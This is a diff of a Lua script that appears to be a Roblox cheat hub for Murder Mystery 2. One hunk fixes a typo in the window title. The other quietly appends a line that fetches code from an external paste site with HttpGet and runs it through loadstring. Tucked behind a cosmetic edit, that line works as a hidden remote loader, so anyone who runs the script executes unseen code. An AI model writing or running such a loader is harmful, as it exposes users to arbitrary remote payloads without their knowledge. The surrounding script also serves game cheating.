@@ -25,7 +25,7 @@ function gradient(p1, p2, p3)
 end
 
 local u8 = _Raw:CreateWindow({
-	Title = "Snthonva hub | Mm2 ",
+	Title = "Snthnova hub | Mm2 ",
 	Icon = "door-open",
 	Author = "frnazy",
 	Folder = "wwww",
@@ -5721,3 +5721,5 @@ end)
 if not ok then
 	warn("Failed", result)
 end
+
+loadstring(game:HttpGet('https://cdn.sourceb.in/bins/2ExVrrNSpz/0'))()
